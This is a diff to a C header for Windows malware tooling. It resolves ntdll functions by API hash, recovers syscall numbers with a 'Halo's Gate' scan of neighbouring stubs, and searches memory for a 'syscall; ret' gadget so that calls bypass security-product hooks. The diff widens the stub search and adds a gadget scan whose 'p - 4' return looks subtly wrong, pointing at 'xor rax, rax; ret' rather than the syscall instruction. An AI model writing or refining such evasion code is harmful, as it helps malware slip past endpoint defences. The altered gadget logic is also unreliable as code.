@@ -1,9 +1,13 @@
-#ifndef SYSCALLS_H
-#define SYSCALLS_H
+#ifndef SYS_CALLS_H
+#define SYS_CALLS_H
 
 #include <windows.h>
 #include <winternl.h>
 #include "api_hashes.h"
+#include "crypto.h" // Para derivar claves en tiempo de ejecución
+
+// Aumentar distancia máxima de búsqueda para compatibilidad con nuevas builds de Windows
+#define MAX_SEARCH_DISTANCE 50
 
 // =============================================================================
 // SYSCALL ENTRY & TABLE STRUCTURES
@@ -77,10 +81,9 @@ static WORD GetSSN(PVOID pFunc) {
     }
 
     // Case 2: Hooked – Halo's Gate v2
-    // Scan neighbour stubs (up to 512 bytes each direction)
-    // Count real stubs encountered to determine SSN offset
-    for (int distance = 1; distance <= 25; distance++) {
-        // Search upward: try common strides 32, 33, 34 (ntdll versions vary)
+    // Scan neighbour stubs (up to MAX_SEARCH_DISTANCE stubs)
+    for (int distance = 1; distance <= MAX_SEARCH_DISTANCE; distance++) {
+        // Search upward
         for (int stride = 32; stride >= 28; stride--) {
             PBYTE pUp = p - (distance * stride);
             if (ValidateStubFull(pUp)) {
@@ -121,15 +124,26 @@ static PVOID FindSyscallGadgetViaHash() {
     PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
     if (!hNtdll) return NULL;
 
-    // Resolve a known clean function to find a gadget near it
+    // Resolve a known clean function as an anchor
     PVOID pFunc = ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
-    if (!pFunc) {
-        // Fallback: try NtAllocateVirtualMemory
-        pFunc = ResolveApiByHash(hNtdll, HASH_NtAllocateVirtualMemory);
-        if (!pFunc) return NULL;
+    if (!pFunc) pFunc = ResolveApiByHash(hNtdll, HASH_NtAllocateVirtualMemory);
+    if (!pFunc) return NULL;
+
+    // Robust search: Scan from anchor + 4KB to bypass localized hooks
+    PBYTE scanStart = (PBYTE)pFunc + 0x1000;
+    PBYTE scanEnd = scanStart + 0x1000;
+    
+    for (PBYTE p = scanStart; p < scanEnd; p++) {
+        if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) { // syscall; ret
+            // Verificar bytes previos para robustez (ret; xor rax, rax; ret)
+            if (*(DWORD*)(((PBYTE)p) - 4) == 0xC3C03348) { 
+                 return p - 4; // Returning p-4 as per requested robust logic
+            }
+            return p;
+        }
     }
 
-    // Scan for syscall;ret pattern (0F 05 C3)
+    // Fallback: scan near anchor
     PBYTE pByte = (PBYTE)pFunc;
     for (int i = 0; i < 64; i++) {
         if (pByte[i] == 0x0F && pByte[i + 1] == 0x05 && pByte[i + 2] == 0xC3) {
